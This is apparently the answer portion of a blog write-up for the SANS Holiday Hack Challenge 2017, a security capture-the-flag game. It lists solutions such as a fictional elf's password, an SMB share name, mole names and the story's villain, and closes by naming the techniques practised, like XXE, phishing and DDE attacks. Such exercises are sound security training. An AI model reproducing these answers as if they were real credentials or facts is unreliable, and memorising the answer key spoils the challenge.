+2. Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
+The topic of the second page of The Great Book is the creation of flying animals in Oz, which lead to the creation of flying reindeers.
+
+Alabaster Snowball's password is __stream_unhappy_buy_loss__.
+
+3. The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?
+
+The name of the share on hhc17-smb-server is __FileStor__.
+
+4. Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?
+
+The fourth page of The Great Book speaks of the battles between Munchkins and Elves, the creation of the Lollipop Guild, and their infiltration in the North Pole population.
+
+5. How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles? Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?
+
+It takes four infractions to be marked as naughty on Santa's list. And the 6 Moles are as follows:
+
+* Boq Questrian
+* Bini Aru
+* Sheri Lewis
+* Kirsty Evans
+* Nina Fitzgerald
+* Beverly Khalil
+
+The discussion between us, Sam the Snowman, and Bumble informs us that the person throwing giant snowballs is Bumble, the Abominable Snow Monster.
+
+6. The North Pole engineering team has introduced an Elf as a Service (EaaS. platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?
+
+The title of the first page of The Great Book is "__The Dreaded Inter-Dimensional Tornadoes.__"
+
+7. Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?
+
+The seventh page of The Great Book gives us details regarding the Witches of Oz, their power, and their neutrality during the Great Schism.
+
+8. Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?
+
+The letter was written by the Wizard of Oz, Santa's good friend.
+
+9. Which character is ultimately the villain causing the giant snowball problem? What is the villain's motive?
+
+The villain causing the giant snowball problem is Glinda, the "Good" Witch. She cast a spell on Bumble to make him throw giant snowballs, in order to create an all-out war between Elves and Munchkins. This would have allowed her to make a profit, by selling spells to both sides of the war.
+
+## Conclusion
+
+As always, SANS has done an amazing job for this year’s Holiday Hack! Although I liked the mini-game from last year, this years was, ok. But - the technical portion, including the LDAP Injection, XXE, Phishing, DDE Attack, XSS Attacks, and some Crypto was a great learning experience and especially showed much of what can occur in the real world, and the outcome of it.
+
+Really looking forward to what's to come next year!
+
+Cheers everyone, thanks for reading!
